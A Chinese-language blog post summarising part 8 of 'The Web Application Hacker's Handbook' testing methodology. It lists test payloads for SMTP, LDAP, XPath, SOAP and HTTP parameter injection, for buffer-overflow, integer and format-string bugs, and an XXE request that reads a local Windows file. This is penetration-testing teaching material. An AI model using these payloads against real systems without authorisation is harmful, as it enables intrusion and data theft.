---
layout:     post
title:      Web应用程序黑客的方法论(8) --Test for Function-Specific Input Vulnerabilities
subtitle:
date:       2020-02-16
author:     D
header-img: 
catalog: true
mermaid: true
tags:
    - web hacking
---

Web应用程序黑客的方法论来自书本 *The Web Application Hacker's Handbook* <br>

除了上一步中针对目标的基于输入的攻击之外，一系列漏洞通常仅在特定种类的功能中表现出来。在继续执行本节中描述的各个步骤之前，您应该查看对应用程序攻击面的评估，以识别可能会出现这些缺陷的特定应用程序功能，并将测试重点放在这些功能上。<br>

![Test for Function-Specific Input Vulnerabilities](/img/test-for-functionality-specific-input-vulnerabilities.png)

# 8.1 SMTP注入测试(Test for SMTP Injection)

8.1.1<br>
对于电子邮件相关功能中使用的每个请求，依次提交以下每个测试字符串作为每个参数，并在相关位置插入您自己的电子邮件地址。您可以使用Burp Intruder来自动执行此操作，如步骤7.1中一般毛刺所述。这些测试字符串已经具有URL编码的特殊字符，因此请勿对其应用任何其他编码。这些测试字符串已经具有URL编码的特殊字符，因此请勿对其应用任何其他编码。<br>
```
<youremail>%0aCc:<youremail>
<youremail>%0d%0aCc:<youremail>
<youremail>%0aBcc:<youremail>
<youremail>%0d%0aBcc:<youremail>
%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>
<youremail>%0aCc:<youremail>
<youremail>%0d%0aCc:<youremail>
<youremail>%0aBcc:<youremail>
<youremail>%0d%0aBcc:<youremail>
%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>
```
8.1.2<br>
查看结果以识别应用程序返回的任何错误消息.如果这些问题似乎与电子邮件功能中的任何问题有关，请调查是否需要微调您的输入以利用漏洞。

8.1.3<br>
监视您指定的电子邮件地址，以查看是否收到任何电子邮件消息.

8.1.4<br>
仔细检查生成相关请求的HTML表单。 它可能包含有关正在使用的服务器端软件的线索。 它还可能包含用于指定电子邮件“收件人”地址的隐藏或禁用字段，您可以直接对其进行修改。

# 8.2 测试本地软件漏洞(Test for Native Software Vulnerabilities)

## 8.2.1 缓冲层的测试(Test for Buffer Overfl ows)

8.2.1.1<br>
对于每个要定位的数据，提交一定范围的长字符串，其长度要比普通缓冲区的大小长一些。 一次定位一项数据，以最大程度地覆盖应用程序中的代码路径。 您可以在Burp Intruder中使用字符块有效载荷源来自动生成各种大小的有效载荷。 以下缓冲区大小适合测试:<br>
```
1100
4200
33000
```

8.2.1.2<br>
监视应用程序的响应以识别任何异常。 尽管可能难以远程诊断问题的性质，但几乎可以肯定，不受控制的溢出会在应用程序中引起异常。 查找以下任何异常:<br>

- HTTP 500状态代码或错误消息，其中其他格式不正确（但不是过长）的输入效果不一样
- 指示在某些外部的本机代码组件中发生故障的信息消息
- 从服务器收到部分或格式错误的响应从
- 与服务器的TCP连接突然关闭，没有返回响应
- 整个Web应用程序不再响应
- 应用程序返回了意外的数据，可能表明内存中的字符串丢失了空终止符

## 8.2.2 测试整数漏洞(Test for Integer Vulnerabilities)

8.2.2.1<br>
在处理本机代码组件时，请标识任何基于整数的数据，尤其是长度指示符，这些数据可用于触发整数漏洞。

8.2.2.2<br>
在每个目标项目内，发送旨在触发任何漏洞的适当有效负载。对于每个目标数据，依次发送一系列不同的值，以表示不同大小整数的有符号和无符号版本的边界情况。比如:<br>

- 0x7f and 0x80 (127 and 128)
- 0xff and 0x100 (255 and 256)
- 0x7ffff and 0x8000 (32767 and 32768)
- 0xffff and 0x10000 (65535 and 65536)
- 0x7fffffff and 0x80000000 (2147483647 and 2147483648)
- 0xffffffff and 0x0 (4294967295 and 0)

8.2.2.3<br>
当修改后的数据以十六进制形式表示时，请同时发送每个测试用例的`小端`和`大端`版本，例如`ff7f`和`7fff`。如果以ASCII格式提交十六进制数字，请使用与应用程序本身用于字母字符相同的大小写，以确保正确解码这些字符。

8.2.2.4<br>
监视应用程序对异常事件的响应，如步骤8.2.1.2中所述。

## 8.2.3 测试格式字符串漏洞(Test for Format String Vulnerabilities)

8.2.3.1<br>
依次定位每个参数，提交包含不同格式说明符的长序列的字符串。例如:<br>
```
%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n
%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
%1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n! etc...
%1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s! etc...
```
请记住，将`%`字符URL编码为`%25`。

8.2.3.2<br>
监视应用程序对异常事件的响应，如步骤8.2.1.2中所述.

# 8.3 测试SOAP注入(Test for SOAP Injection)

8.3.1<br>
依次定位您怀疑正在通过SOAP消息处理的每个参数。提交流氓XML结束标记，例如`</foo>`。如果没有错误发生，则可能是您的输入未插入SOAP消息中或已通过某种方式进行了清理。

8.3.2<br>
如果收到错误，请提交有效的开始和结束标记对，例如`<foo>` `</foo>`。如果这导致错误消失，则该应用程序可能很容易受到攻击。

8.3.3<br>
如果您提交的项目被复制回应用程序的响应中，请依次提交以下两个值。如果您发现其中一个返回为另一个，或者只是简单地返回test，则可以确定您的输入已插入基于XML的消息中。
```
test<foo/>
test<foo></foo>
```

8.3.4<br>
如果HTTP请求包含可能要放入SOAP消息中的多个参数，请尝试将开始注释字符`<!--`插入一个参数，将结束注释字符`!-->`插入另一个参数。然后切换它们（因为您无法知道参数的显示顺序）。这可能会注释掉服务器SOAP消息的一部分，这可能会更改应用程序的逻辑或导致不同的错误情况，从而可能泄露信息。

# 8.4 测试LDAP注入(Test for LDAP Injection)

8.4.1<br>
在使用用户提供的数据从目录服务中检索信息的任何功能中，依次定位每个参数以测试是否有可能注入LDAP查询中。

8.4.2<br>
提交字符`*`.如果返回大量结果，则表明您正在处理LDAP查询。

8.4.3<br>
尝试输入多个右括号:
```
))))))))))))))
```
此输入使查询语法无效，因此，如果导致错误或其他异常行为，则应用程序可能会受到攻击（尽管许多其他应用程序功能和注入情况可能以相同的方式运行）。

8.4.4<br>
尝试输入旨在干扰不同类型查询的各种表达式，并查看它们是否使您能够影响返回的结果。`cn`属性受所有LDAP实现支持，如果您不知道所查询目录的任何详细信息，则该属性很有用:<br>
```
)(cn=*
*))(|(cn=*
*))%00
```

8.4.5<br>
尝试在输入的末尾添加额外的属性，使用逗号分隔每个项目。 依次测试每个属性。 错误指示该属性在当前上下文中无效。 LDAP查询的目录中通常使用以下属性:<br>
```
cn
c
mail
givenname
o
ou
dc
l
uid
objectclass
postaladdress
dn
sncn
c
mail
givenname
o
ou
dc
l
uid
objectclass
postaladdress
dn
sn
```

# 8.5 测试 XPath 注入(Test for XPath Injection)

8.5.1<br>
尝试提交以下值，并确定它们是否导致不同的应用程序行为而不会引起错误:<br>
```
' or count(parent::*[position()=1])=0 or 'a'='b
' or count(parent::*[position()=1])>0 or 'a'='b
```

8.5.2<br>
如果参数是数字，请尝试以下测试字符串:<br>
```
1 or count(parent::*[position()=1])=0
1 or count(parent::*[position()=1])>0
```

8.5.3<br>
如果任何上述字符串在应用程序内引起差异行为而不会引起错误，则很可能可以通过设计测试条件来一次提取1个字节的信息来提取任意数据。使用以下格式的一系列条件来确定当前节点的父节点的名称:<br>
```
substring(name(parent::*[position()=1]),1,1)='a'
```

8.5.4<br>
提取父节点的名称之后，使用以下格式的一系列条件来提取XML树中的所有数据:<br>
```
substring(//parentnodename[position()=1]/child::node()[position()=1]
/text(),1,1)='a'
```

# 8.6 测试后端请求注入(Test for Back-End Request Injection)

8.6.1<br>
找到在参数中指定了内部服务器名称或IP地址的任何实例。提交任意服务器和端口，并监视应用程序是否超时。还要提交localhost，最后是您自己的IP地址，以监视指定端口上的传入连接。

8.6.2<br>
定位到一个返回特定页面的特定值的请求参数，并尝试使用各种语法附加新注入的参数，包括以下内容:<br>
```
%26foo%3dbar(URL-encoded &foo=bar)
%3bfoo%3dbar(URL-encoded ;foo=bar)
%2526foo%253dbar(Double URL-encoded &foo=bar)
```
如果应用程序的行为就像未修改原始参数一样，则可能会出现HTTP参数注入漏洞。尝试通过注入已知的参数名称/值对来攻击后端请求，这些参数名称/值对可能会更改后端逻辑，如第10章所述。

# 8.7 测试 XXE 注入(Test for XXE Injection)

8.7.1<br>
如果用户向服务器提交XML，则可能会发生外部实体注入攻击。 如果已知返回给用户的字段，请尝试指定一个外部实体，如以下示例所示:<br>
```
POST /search/128/AjaxSearch.ashx HTTP/1.1
Host: mdsec.net
Content-Type: text/xml; charset=UTF-8
Content-Length: 115

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///windows/win.ini" > ]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
```
如果找不到已知字段，请指定一个外部实体`"http://192.168.1.1:25"`并监视页面响应时间。 如果页面返回所需的时间明显较长或超时，则可能容易受到攻击。<br>


[Web应用程序黑客的方法论(7)](https://dm116.github.io/2020/02/14/web-application-hacker-methodology_7/)<br>
[Web应用程序黑客的方法论(9)](https://dm116.github.io/2020/02/17/web-application-hacker-methodology_9/)<br>


